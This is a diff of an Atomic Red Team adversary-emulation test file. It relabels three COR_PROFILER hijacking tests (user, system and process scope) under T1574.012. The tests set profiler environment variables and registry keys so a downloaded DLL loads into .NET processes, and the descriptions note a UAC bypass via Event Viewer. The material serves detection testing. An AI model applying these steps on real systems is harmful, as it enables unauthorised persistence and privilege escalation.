@@ -1,21 +1,23 @@
-attack_technique: T1546.015
-display_name: 'Event Triggered Execution: Component Object Model Hijacking'
+attack_technique: T1574.012
+display_name: 'Hijack Execution Flow: COR_PROFILER'
 atomic_tests:
-- name: COM Hijack Leveraging user scope COR_PROFILER
+- name: User scope COR_PROFILER
   auto_generated_guid: 9d5f89dc-c3a5-4f8a-a4fc-a6ed02e7cb5a
   description: |
     Creates user scope environment variables and CLSID COM object to enable a .NET profiler (COR_PROFILER).
-    The unmanaged profiler DLL (`atomicNotepad.dll`) executes when the CLR is loaded by the Event Viewer process.
+    The unmanaged profiler DLL (`T1574.012x64.dll`) executes when the CLR is loaded by the Event Viewer process.
     Additionally, the profiling DLL will inherit the integrity level of Event Viewer bypassing UAC and executing `notepad.exe` with high integrity.
     If the account used is not a local administrator the profiler DLL will still execute each time the CLR is loaded by a process, however,
     the notepad process will not execute with high integrity.
+
+    Reference: https://redcanary.com/blog/cor_profiler-for-persistence/
   supported_platforms:
   - windows
   input_arguments:
     file_name:
       description: unmanaged profiler DLL
       type: Path
-      default: PathToAtomicsFolder\T1546.015\bin\T1546.015x64.dll
+      default: PathToAtomicsFolder\T1574.012\bin\T1574.012x64.dll
     clsid_guid:
       description: custom clsid guid
       type: String
@@ -28,7 +30,7 @@ atomic_tests:
       if (Test-Path #{file_name}) {exit 0} else {exit 1}
     get_prereq_command: |
       New-Item -Type Directory (split-path #{file_name}) -ErrorAction ignore | Out-Null
-      Invoke-WebRequest "https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1546.015/bin/T1546.015x64.dll" -OutFile "#{file_name}"
+      Invoke-WebRequest "https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1574.012/bin/T1574.012x64.dll" -OutFile "#{file_name}"
   executor:
     command: |
       Write-Host "Creating registry keys in HKCU:Software\Classes\CLSID\#{clsid_guid}" -ForegroundColor Cyan
@@ -44,20 +46,22 @@ atomic_tests:
       Remove-ItemProperty -Path HKCU:\Environment -Name "COR_PROFILER" -Force -ErrorAction Ignore | Out-Null
       Remove-ItemProperty -Path HKCU:\Environment -Name "COR_PROFILER_PATH" -Force -ErrorAction Ignore | Out-Null
     name: powershell
-- name: COM Hijack Leveraging System Scope COR_PROFILER
+- name: System Scope COR_PROFILER
   auto_generated_guid: f373b482-48c8-4ce4-85ed-d40c8b3f7310
   description: |
     Creates system scope environment variables to enable a .NET profiler (COR_PROFILER). System scope environment variables require a restart to take effect.
-    The unmanaged profiler DLL (`atomicNotepad.dll`) executes when the CLR is loaded by any process. Additionally, the profiling DLL will inherit the integrity
+    The unmanaged profiler DLL (T1574.012x64.dll`) executes when the CLR is loaded by any process. Additionally, the profiling DLL will inherit the integrity
     level of Event Viewer bypassing UAC and executing `notepad.exe` with high integrity. If the account used is not a local administrator the profiler DLL will
     still execute each time the CLR is loaded by a process, however, the notepad process will not execute with high integrity.
+
+    Reference: https://redcanary.com/blog/cor_profiler-for-persistence/
   supported_platforms:
   - windows
   input_arguments:
     file_name:
       description: unmanaged profiler DLL
       type: Path
-      default: PathToAtomicsFolder\T1546.015\bin\T1546.015x64.dll
+      default: PathToAtomicsFolder\T1574.012\bin\T1574.012x64.dll
     clsid_guid:
       description: custom clsid guid
       type: String
@@ -70,7 +74,7 @@ atomic_tests:
       if (Test-Path #{file_name}) {exit 0} else {exit 1}
     get_prereq_command: |
       New-Item -Type Directory (split-path #{file_name}) -ErrorAction ignore | Out-Null
-      Invoke-WebRequest "https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1546.015/bin/T1546.015x64.dll" -OutFile "#{file_name}"
+      Invoke-WebRequest "https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1574.012/bin/T1574.012x64.dll" -OutFile "#{file_name}"
   executor:
     command: |
       Write-Host "Creating system environment variables" -ForegroundColor Cyan
@@ -83,17 +87,19 @@ atomic_tests:
       Remove-ItemProperty -Path 'HKLM:\SYSTEM\CurrentControlSet\Control\Session Manager\Environment' -Name "COR_PROFILER_PATH" -Force -ErrorAction Ignore | Out-Null
     name: powershell
     elevation_required: true
-- name: COM Hijack Leveraging registry-free process scope COR_PROFILER
+- name: Registry-free process scope COR_PROFILER
   auto_generated_guid: 79d57242-bbef-41db-b301-9d01d9f6e817
   description: |
-    Creates process scope environment variables to enable a .NET profiler (COR_PROFILER) without making changes to the registry. The unmanaged profiler DLL (`atomicNotepad.dll`) executes when the CLR is loaded by PowerShell.
+    Creates process scope environment variables to enable a .NET profiler (COR_PROFILER) without making changes to the registry. The unmanaged profiler DLL (`T1574.012x64.dll`) executes when the CLR is loaded by PowerShell.
+
+    Reference: https://redcanary.com/blog/cor_profiler-for-persistence/
   supported_platforms:
   - windows
   input_arguments:
     file_name:
       description: unamanged profiler DLL
       type: Path
-      default: PathToAtomicsFolder\T1546.015\bin\T1546.015x64.dll
+      default: PathToAtomicsFolder\T1574.012\bin\T1574.012x64.dll
     clsid_guid:
       description: custom clsid guid
       type: String
@@ -106,7 +112,7 @@ atomic_tests:
       if (Test-Path #{file_name}) {exit 0} else {exit 1}
     get_prereq_command: |
       New-Item -Type Directory (split-path #{file_name}) -ErrorAction ignore | Out-Null
-      Invoke-WebRequest "https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1546.015/bin/T1546.015x64.dll" -OutFile "#{file_name}"
+      Invoke-WebRequest "https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1574.012/bin/T1574.012x64.dll" -OutFile "#{file_name}"
   executor:
     command: |
       $env:COR_ENABLE_PROFILING = 1
